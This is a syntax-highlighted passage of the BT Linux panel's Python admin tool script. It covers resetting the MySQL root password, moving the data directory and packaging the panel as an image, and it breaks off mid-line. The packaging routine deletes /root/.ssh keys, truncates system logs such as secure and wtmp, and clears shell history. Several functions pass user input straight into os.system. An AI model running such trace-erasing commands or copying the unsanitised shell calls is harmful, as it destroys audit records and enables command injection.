<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment"># +-------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># | 宝塔Linux面板</span></span><br><span class="line"><span class="comment"># +-------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># | Copyright (c) 2015-2099 宝塔软件(http://bt.cn) All rights reserved.</span></span><br><span class="line"><span class="comment"># +-------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># | Author: hwliang &lt;hwl@bt.cn&gt;</span></span><br><span class="line"><span class="comment"># +-------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------</span></span><br><span class="line"><span class="comment"># 工具箱</span></span><br><span class="line"><span class="comment">#------------------------------</span></span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line">panelPath = <span class="string">&#x27;/www/server/panel/&#x27;</span></span><br><span class="line">os.chdir(panelPath)</span><br><span class="line">sys.path.insert(<span class="number">0</span>,panelPath + <span class="string">&quot;class/&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> public,time,json</span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span>: raw_input = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置MySQL密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_mysql_root</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="keyword">import</span> db,os</span><br><span class="line">    sql = db.Sql()</span><br><span class="line"></span><br><span class="line">    root_mysql = <span class="string">&#x27;&#x27;&#x27;#!/bin/bash</span></span><br><span class="line"><span class="string">PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin</span></span><br><span class="line"><span class="string">export PATH</span></span><br><span class="line"><span class="string">pwd=$1</span></span><br><span class="line"><span class="string">/etc/init.d/mysqld stop</span></span><br><span class="line"><span class="string">mysqld_safe --skip-grant-tables&amp;</span></span><br><span class="line"><span class="string">echo &#x27;正在修改密码...&#x27;;</span></span><br><span class="line"><span class="string">echo &#x27;The set password...&#x27;;</span></span><br><span class="line"><span class="string">sleep 6</span></span><br><span class="line"><span class="string">m_version=$(cat /www/server/mysql/version.pl|grep -E &quot;(5.1.|5.5.|5.6.|10.0|10.1)&quot;)</span></span><br><span class="line"><span class="string">if [ &quot;$m_version&quot; != &quot;&quot; ];then</span></span><br><span class="line"><span class="string">    mysql -uroot -e &quot;UPDATE mysql.user SET password=PASSWORD(&#x27;$&#123;pwd&#125;&#x27;) WHERE user=&#x27;root&#x27;&quot;;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">    m_version=$(cat /www/server/mysql/version.pl|grep -E &quot;(5.7.|8.0.|10.4.)&quot;)</span></span><br><span class="line"><span class="string">    if [ &quot;$m_version&quot; != &quot;&quot; ];then</span></span><br><span class="line"><span class="string">        mysql -uroot -e &quot;FLUSH PRIVILEGES;update mysql.user set authentication_string=&#x27;&#x27; where user=&#x27;root&#x27; and (host=&#x27;127.0.0.1&#x27; or host=&#x27;localhost&#x27;);alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;$&#123;pwd&#125;&#x27;;alter user &#x27;root&#x27;@&#x27;127.0.0.1&#x27; identified by &#x27;$&#123;pwd&#125;&#x27;;FLUSH PRIVILEGES;&quot;;</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">        mysql -uroot -e &quot;update mysql.user set authentication_string=password(&#x27;$&#123;pwd&#125;&#x27;) where user=&#x27;root&#x27;;&quot;</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">mysql -uroot -e &quot;FLUSH PRIVILEGES&quot;;</span></span><br><span class="line"><span class="string">pkill -9 mysqld_safe</span></span><br><span class="line"><span class="string">pkill -9 mysqld</span></span><br><span class="line"><span class="string">sleep 2</span></span><br><span class="line"><span class="string">/etc/init.d/mysqld start</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo &#x27;===========================================&#x27;</span></span><br><span class="line"><span class="string">echo &quot;root密码成功修改为: $&#123;pwd&#125;&quot;</span></span><br><span class="line"><span class="string">echo &quot;The root password set $&#123;pwd&#125;  successuful&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    public.writeFile(<span class="string">&#x27;mysql_root.sh&#x27;</span>,root_mysql)</span><br><span class="line">    os.system(<span class="string">&quot;/bin/bash mysql_root.sh &quot;</span> + password)</span><br><span class="line">    os.system(<span class="string">&quot;rm -f mysql_root.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">    result = sql.table(<span class="string">&#x27;config&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).setField(<span class="string">&#x27;mysql_root&#x27;</span>,password)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置面板密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_panel_pwd</span>(<span class="params">password,ncli = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">import</span> db</span><br><span class="line">    sql = db.Sql()</span><br><span class="line">    result = sql.table(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).setField(<span class="string">&#x27;password&#x27;</span>,public.password_salt(public.md5(password),uid=<span class="number">1</span>))</span><br><span class="line">    username = sql.table(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).getField(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ncli:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|-用户名: &quot;</span> + username)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|-新密码: &quot;</span> + password)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(username)</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置数据库目录</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_mysql_dir</span>(<span class="params">path</span>):</span><br><span class="line">    mysql_dir = <span class="string">&#x27;&#x27;&#x27;#!/bin/bash</span></span><br><span class="line"><span class="string">PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin</span></span><br><span class="line"><span class="string">export PATH</span></span><br><span class="line"><span class="string">oldDir=`cat /etc/my.cnf |grep &#x27;datadir&#x27;|awk &#x27;&#123;print $3&#125;&#x27;`</span></span><br><span class="line"><span class="string">newDir=$1</span></span><br><span class="line"><span class="string">mkdir $newDir</span></span><br><span class="line"><span class="string">if [ ! -d &quot;$&#123;newDir&#125;&quot; ];then</span></span><br><span class="line"><span class="string">    echo &#x27;The specified storage path does not exist!&#x27;</span></span><br><span class="line"><span class="string">    exit</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">echo &quot;Stopping MySQL service...&quot;</span></span><br><span class="line"><span class="string">/etc/init.d/mysqld stop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo &quot;Copying files, please wait...&quot;</span></span><br><span class="line"><span class="string">\cp -r -a $oldDir/* $newDir</span></span><br><span class="line"><span class="string">chown -R mysql.mysql $newDir</span></span><br><span class="line"><span class="string">sed -i &quot;s#$oldDir#$newDir#&quot; /etc/my.cnf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo &quot;Starting MySQL service...&quot;</span></span><br><span class="line"><span class="string">/etc/init.d/mysqld start</span></span><br><span class="line"><span class="string">echo &#x27;&#x27;</span></span><br><span class="line"><span class="string">echo &#x27;Successful&#x27;</span></span><br><span class="line"><span class="string">echo &#x27;---------------------------------------------------------------------&#x27;</span></span><br><span class="line"><span class="string">echo &quot;Has changed the MySQL storage directory to: $newDir&quot;</span></span><br><span class="line"><span class="string">echo &#x27;---------------------------------------------------------------------&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    public.writeFile(<span class="string">&#x27;mysql_dir.sh&#x27;</span>,mysql_dir)</span><br><span class="line">    os.system(<span class="string">&quot;/bin/bash mysql_dir.sh &quot;</span> + path)</span><br><span class="line">    os.system(<span class="string">&quot;rm -f mysql_dir.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#封装</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PackagePanel</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;========================================================&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理日志信息...&#x27;</span>),</span><br><span class="line">    public.M(<span class="string">&#x27;logs&#x27;</span>).where(<span class="string">&#x27;id!=?&#x27;</span>,(<span class="number">0</span>,)).delete()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\t\t\033[1;32m[done]\033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理任务历史...&#x27;</span>),</span><br><span class="line">    public.M(<span class="string">&#x27;tasks&#x27;</span>).where(<span class="string">&#x27;id!=?&#x27;</span>,(<span class="number">0</span>,)).delete()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\t\t\033[1;32m[done]\033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理网络监控记录...&#x27;</span>),</span><br><span class="line">    public.M(<span class="string">&#x27;network&#x27;</span>).dbfile(<span class="string">&#x27;system&#x27;</span>).where(<span class="string">&#x27;id!=?&#x27;</span>,(<span class="number">0</span>,)).delete()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\t\033[1;32m[done]\033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理CPU监控记录...&#x27;</span>),</span><br><span class="line">    public.M(<span class="string">&#x27;cpuio&#x27;</span>).dbfile(<span class="string">&#x27;system&#x27;</span>).where(<span class="string">&#x27;id!=?&#x27;</span>,(<span class="number">0</span>,)).delete()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\t\033[1;32m[done]\033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理磁盘监控记录...&#x27;</span>),</span><br><span class="line">    public.M(<span class="string">&#x27;diskio&#x27;</span>).dbfile(<span class="string">&#x27;system&#x27;</span>).where(<span class="string">&#x27;id!=?&#x27;</span>,(<span class="number">0</span>,)).delete()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\t\033[1;32m[done]\033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理IP信息...&#x27;</span>),</span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /www/server/panel/data/iplist.txt&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /www/server/panel/data/address.pl&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /www/server/panel/data/*.login&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /www/server/panel/data/domain.conf&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /www/server/panel/data/user*&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /www/server/panel/data/admin_path.pl&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /root/.ssh/*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\t\033[1;32m[done]\033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理系统使用痕迹...&#x27;</span>),</span><br><span class="line">    command = <span class="string">&#x27;&#x27;&#x27;cat /dev/null &gt; /var/log/boot.log</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/btmp</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/cron</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/dmesg</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/firewalld</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/grubby</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/lastlog</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/mail.info</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/maillog</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/messages</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/secure</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/spooler</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/syslog</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/tallylog</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/wpa_supplicant.log</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/wtmp</span></span><br><span class="line"><span class="string">cat /dev/null &gt; /var/log/yum.log</span></span><br><span class="line"><span class="string">history -c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    os.system(command)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\t\033[1;32m[done]\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;|-请选择用户初始化方式：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; (1) 访问面板页面时显示初始化页面&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; (2) 首次启动时自动随机生成新帐号密码&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    p_input = <span class="built_in">input</span>(<span class="string">&quot;请选择初始化方式(default: 1): &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p_input)</span><br><span class="line">    <span class="keyword">if</span> p_input <span class="keyword">in</span> [<span class="number">2</span>,<span class="string">&#x27;2&#x27;</span>]:</span><br><span class="line">        public.writeFile(<span class="string">&#x27;/www/server/panel/aliyun.pl&#x27;</span>,<span class="string">&quot;True&quot;</span>)</span><br><span class="line">        s_file = <span class="string">&#x27;/www/server/panel/install.pl&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(s_file): os.remove(s_file)</span><br><span class="line">        public.M(<span class="string">&#x27;config&#x27;</span>).where(<span class="string">&quot;id=?&quot;</span>,(<span class="string">&#x27;1&#x27;</span>,)).setField(<span class="string">&#x27;status&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        public.writeFile(<span class="string">&#x27;/www/server/panel/install.pl&#x27;</span>,<span class="string">&quot;True&quot;</span>)</span><br><span class="line">        public.M(<span class="string">&#x27;config&#x27;</span>).where(<span class="string">&quot;id=?&quot;</span>,(<span class="string">&#x27;1&#x27;</span>,)).setField(<span class="string">&#x27;status&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    port = public.readFile(<span class="string">&#x27;data/port.pl&#x27;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;========================================================&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;32m|-面板封装成功,请不要再登陆面板做任何其它操作!\033[0m&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p_input 